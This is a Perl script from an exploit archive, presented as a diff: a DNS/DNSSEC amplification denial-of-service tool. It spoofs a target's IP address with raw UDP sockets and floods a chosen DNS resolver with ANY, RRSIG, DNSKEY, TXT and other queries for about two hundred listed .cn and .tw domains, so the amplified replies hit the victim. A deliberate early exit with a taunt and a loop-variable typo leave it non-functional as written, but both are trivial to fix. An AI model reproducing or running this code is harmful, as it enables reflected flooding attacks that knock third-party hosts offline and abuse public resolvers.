@@ -1,0 +1,318 @@
+id: 28115
+date: 07/11/2017
+title: DNSSEC RR Stub Resolver Denial Of Service Exploit
+author: Todor Donev
+cves: 
+
+#!/usr/bin/perl
+#
+#
+#  DNS/DNSSEC RR stub resolvers amplification ddos
+#
+#  Copyright 2017 (c) Todor Donev 
+#  todor.donev@gmail.com
+#  https://www.ethical-hacker.org/
+#  https://www.facebook.com/ethicalhackerorg
+#
+#
+#  Disclaimer:
+#  This or previous program is for Educational
+#  purpose ONLY. Do not use it without permission.
+#  The usual disclaimer applies, especially the
+#  fact that Todor Donev is not liable for any
+#  damages caused by direct or indirect use of the
+#  information or functionality provided by these
+#  programs. The author or any Internet provider
+#  bears NO responsibility for content or misuse
+#  of these programs or any derivatives thereof.
+#  By using these programs you accept the fact
+#  that any damage (dataloss, system crash,
+#  system compromise, etc.) caused by the use
+#  of these programs is not Todor Donev's
+#  responsibility.
+#
+#  Use at your own risk and educational 
+#  purpose ONLY!
+#
+#  See also, UDP-based Amplification Attacks:
+#  https://www.us-cert.gov/ncas/alerts/TA14-017A
+#
+#
+
+use Net::RawIP;
+use Net::DNS;
+use Data::Validate::IP qw(is_ipv4);
+
+my ($target, $dnsamp) = @ARGV;
+my  $port = '53';
+
+print "[ DNS/DNSSEC RR stub resolvers amplification ddos\n";
+print "[ === \n";
+print "[ Copyright 2017 (c) Todor Donev\n";
+print "[ todor.donev\@gmail.com\n";
+print "[ https://www.ethical-hacker.org/\n";
+print "[ https://www.facebook.com/ethicalhackerorg\n";
+die("\n\n\n\n\n\t\t\t\t\t\t\tr34d 7h3 c0d3 m0r0n\n\n\n\n\n\n");
+die "[ Error: Port must be between 1 and 65535!\n" if ($port < 1 || $port > 65535);
+die "[ Usage: perl $0 <target> <dns amplificator>\n" unless (scalar @ARGV)==2;
+die "[ Error: Invalid IP address\n" if not is_ipv4(@ARGV);
+
+my @domains = qw(
+stan.cn
+u888.cn
+welovechina.cn
+38shop.cn
+hansa-tmp.cn
+incorpnow.cn
+freeadschina.cn
+mediatech.cn
+17ping.cn
+chienhong.cn
+geektown.cn
+x-rage.cn
+aonhewittconsulting.cn
+iartemis.cn
+shinyeh.cn
+gedanyao.cn
+mufamily.cn
+onepod.cn
+wenjunnet.cn
+xn--365-r48dj4n6n7f.cn
+procode.cn
+ydy.cn
+waylink.cn
+onetech.cn
+weirandassociates.cn
+chengshaobo.cn
+cs-pro.cn
+floweradvisor.cn
+doraxia.cn
+greenlon.cn
+pcex.cn
+projectww.cn
+stopwater.cn
+chopstickshouse.cn
+incorporatenow.cn
+magento4u.cn
+qnap.cn
+liuxiannian.cn
+tangjiamei.cn
+zlyzwy.cn
+dreyfussandco.cn
+bentium.cn
+bmbbe.cn
+hellocq.cn
+patenttoday.cn
+qiuchangtong.cn
+hongkonglaw.cn
+jandtwindmills.cn
+postojna.cn
+centos-repo.cn
+dsn888.cn
+jiujiaotang.cn
+netskys.cn
+zhaogedanyang.cn
+asiapacificpatent.cn
+axelsystems.cn
+speedtech.cn
+ambassador.cn
+eriver.cn
+hbhebo.cn
+robustness.cn
+ccluzhiyi.cn
+chtss.cn
+maskcase.cn
+hpc.tw
+4040.idv.tw
+xxxxx.tw
+tuck.tw
+hin.tw
+linkin.tw
+skies.tw
+ohi.tw
+ddot.tw
+adagio.tw
+sino.tw
+hp-user.tw
+encyclopedia.tw
+aptrc.tw
+firedragon.tw
+treetech.tw
+uk-unitour.tw
+drama.tw
+startist.tw
+ics.tw
+xman.tw
+h2oplus.tw
+fundot.tw
+c60.tw
+chen-yang.tw
+1332.tw
+ezcall.tw
+alexandra.tw
+friendship.tw
+ctotw.tw
+shinmin.tw
+haua.tw
+ippbx.tw
+sto.tw
+fairway.tw
+idx.tw
+topone.tw
+sahe.tw
+bae.tw
+3cnet.tw
+felixtw.tw
+malossi.tw
+zapto.tw
+archer.tw
+clever.tw
+fu-good.tw
+lwl.tw
+wuzhou.tw
+11688.tw
+ocean.tw
+hsu.tw
+mnst.tw
+vyatta.tw
+yuyi.tw
+dailyview.tw
+showingwang.tw
+faryne.tw
+superd.tw
+bwyouth.tw
+eruru.tw
+fengshing.tw
+from.tw
+ha2.tw
+season.tw
+wetrust.tw
+xinxinya.tw
+zuijade.tw
+angelwind.tw
+mycoco.tw
+tapc.tw
+carat.com.tw
+icart.tw
+iseasy.tw
+qhi.tw
+redfox.tw
+sofare.tw
+uco.tw
+victor.tw
+204.tw
+chiang.tw
+e-top.tw
+ordermaster.tw
+ewebs.tw
+oos.tw
+spike.tw
+eldora.tw
+faitlami.tw
+hanpo.tw
+junk.tw
+knick.tw
+omegatech.tw
+pona.tw
+so-good.tw
+ychsu.tw
+yifanchen.tw
+bogusx.idv.tw
+dowgo.tw
+etour.com.tw
+ieti.com.tw
+rollermatic.tw
+);
+
+# open(my $fhdom, '<', 'domains.txt') or die "[ Error: $!\n";
+# chomp(my @domains = <$fhdom>);
+# close $fhdom;
+
+for (my $j=0; $j<=@domains; $j++) {
+my $NSQueryPak = new Net::DNS::Packet($domains[$j], "NS", "IN");
+my $nsdata = $NSQueryPak->data;
+my $SOAQueryPak = new Net::DNS::Packet($domains[$j], "SOA", "IN");
+my $soadata = $SOAQueryPak->data;
+my $AQueryPak = new Net::DNS::Packet($domains[$j], "A", "IN");
+my $adata = $AQueryPak->data;
+my $CNAMEQueryPak = new Net::DNS::Packet($domains[$j], "CNAME", "IN");
+my $cnamedata = $CNAMEQueryPak->data;
+my $TXTQueryPak = new Net::DNS::Packet($domains[$j], "TXT", "IN");
+my $txtdata = $TXTQueryPak->data;
+my $ANYQueryPak = new Net::DNS::Packet($domains[$j], "ANY", "IN");
+my $anydata = $ANYQueryPak->data;
+my $MXQueryPak = new Net::DNS::Packet($domains[$j], "MX", "IN");
+my $mxdata = $MXQueryPak->data;
+my $RRSIGQueryPak = new Net::DNS::Packet($domains[$j], "RRSIG", "IN");
+my $rrsigdata = $RRSIGQueryPak->data;
+my $DNSKEYQueryPak = new Net::DNS::Packet($domains[$j], "DNSKEY", "IN");
+my $dnskeydata = $DNSKEYQueryPak->data;
+my $RPQueryPak = new Net::DNS::Packet($domains[$j], "RP", "IN");
+my $rpdata = $RPQueryPak->data;
+my $NAPTRQueryPak = new Net::DNS::Packet($domains[$j], "NAPTR", "IN");
+my $naptrdata = $NAPTRQueryPak->data;
+my $NSEC3QueryPak = new Net::DNS::Packet($domains[$j], "NSEC3", "IN");
+my $nsec3data = $NSEC3QueryPak->data;
+my $NSECQueryPak = new Net::DNS::Packet($domains[$j], "NSEC", "IN");
+my $nsecdata = $NSECQueryPak->data;
+my $NSEC3PARAMQueryPak = new Net::DNS::Packet($domains[$j], "NSEC3PARAM", "IN");
+my $nsec3paramdata = $NSEC3PARAMQueryPak->data;
+my $SRVQueryPak = new Net::DNS::Packet($domains[$j], "SRV", "IN");
+my $srvdata = $SRVQueryPak->data;
+my $DSQueryPak = new Net::DNS::Packet($domains[$j], "DS", "IN");
+my $dsdata = $DSQueryPak->data;
+
+my $sock = new Net::RawIP({ udp => {} }) or die "[ Error: $!\n";
+   $sock->set({ ip =>  {
+      saddr  => $target,
+      daddr  => $dnsamp},
+    udp =>  { 
+      source => 31337,   
+      dest   => $port,  
+      data   => $nsdata}}) or die "[ Error: $!\n";
+  $sock->send;
+
+  for (my $rrsigr=0; $rrsigr < 3; $rrsigr++) {
+    $sock->set({udp => { data=>$rrsigdata }});
+    $sock->send;
+    select(undef, undef, undef, 0.20);
+  }
+  for (my $dnskeyr=0; $dnskey < 3; $dnskey++) {
+    $sock->set({udp => { data=>$dnskeydata }});
+    $sock->send;
+  }
+  $sock->set({udp => { data=>$soadata }});
+  $sock->send;
+  $sock->set({udp => { data=>$adata }});
+  $sock->send;
+  for (my $txtr=0; $txtr < 3; $txtr++) {
+    $sock->set({udp => { data=>$txtdata }});
+    $sock->send;
+  }
+  $sock->set({udp => { data=>$cnamedata }});
+  $sock->send;
+  for (my $anyr=0; $anyr < 3; $anyr++) {
+    $sock->set({udp => { data=>$anydata }});
+    $sock->send;
+    select(undef, undef, undef, 0.20);
+  }
+  $sock->set({udp => { data=>$mxdata }});
+  $sock->send;
+  $sock->set({udp => { data=>$rpdata }});
+  $sock->send;
+  $sock->set({udp => { data=>$dsdata }});
+  $sock->send;
+  $sock->set({udp => { data=>$srvdata }});
+  $sock->send;
+  $sock->set({udp => { data=>$nsecdata }});
+  $sock->send;
+  $sock->set({udp => { data=>$nsec3data }});
+  $sock->send;
+  $sock->set({udp => { data=>$nsec3paramdata }});
+  $sock->send;
+  $sock->set({udp => { data=>$naptrdata }});
+  $sock->send;
+  select(undef, undef, undef, 0.20);
+}
+
+#  0day.today [2023-03-26]  #
